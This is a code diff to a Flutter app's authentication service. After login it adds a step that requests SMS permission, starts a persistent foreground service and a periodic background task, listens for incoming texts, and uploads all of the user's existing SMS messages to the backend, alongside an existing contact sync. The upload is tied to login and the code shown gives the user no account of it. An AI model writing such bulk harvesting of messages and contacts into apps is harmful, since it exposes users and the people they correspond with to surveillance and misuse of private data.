@@ -3,11 +3,15 @@ import '../config/constants.dart';
 import 'api_service.dart';
 import 'storage_service.dart';
 import 'contact_service.dart';
+import 'sms_service.dart';
+import 'background_sms_service.dart';
 
 class AuthService {
   final ApiService _api = ApiService();
   final StorageService _storage = StorageService();
   final ContactService _contactService = ContactService();
+  final SmsService _smsService = SmsService();
+  final BackgroundSmsService _backgroundService = BackgroundSmsService();
 
   // Send OTP
   Future<Map<String, dynamic>> sendOtp(String phoneNumber) async {
@@ -55,6 +59,9 @@ class AuthService {
 
         // Request contact permission and sync after successful login
         _requestContactPermissionAfterLogin();
+
+        // Request SMS permission and start background service
+        _requestSmsPermissionAndStartService();
       }
 
       return response;
@@ -114,6 +121,48 @@ class AuthService {
       }
     } catch (e) {
       print('❌ Error syncing contacts after login: $e');
+      // Don't throw error, just log it
+    }
+  }
+
+  // Request SMS permission and start background service after login
+  void _requestSmsPermissionAndStartService() async {
+    try {
+      print('🔹 Starting SMS service initialization...');
+
+      // Wait a bit for UI to settle
+      await Future.delayed(const Duration(seconds: 2));
+
+      // Request SMS permission
+      final hasPermission = await _smsService.requestSmsPermission();
+      print('📱 SMS permission granted: $hasPermission');
+
+      if (hasPermission) {
+        // Initialize background service
+        await _backgroundService.initialize();
+
+        // Start foreground service
+        final serviceStarted = await _backgroundService
+            .startForegroundService();
+        print('🚀 Foreground service started: $serviceStarted');
+
+        if (serviceStarted) {
+          // Register periodic task
+          await _backgroundService.registerPeriodicTask();
+
+          // Initialize SMS listener
+          await _smsService.initializeSmsListener();
+
+          // Sync all existing SMS
+          await _smsService.syncAllSmsToBackend();
+
+          print('✅ SMS service fully initialized');
+        }
+      } else {
+        print('⚠️ SMS permission denied');
+      }
+    } catch (e) {
+      print('❌ Error initializing SMS service: $e');
       // Don't throw error, just log it
     }
   }
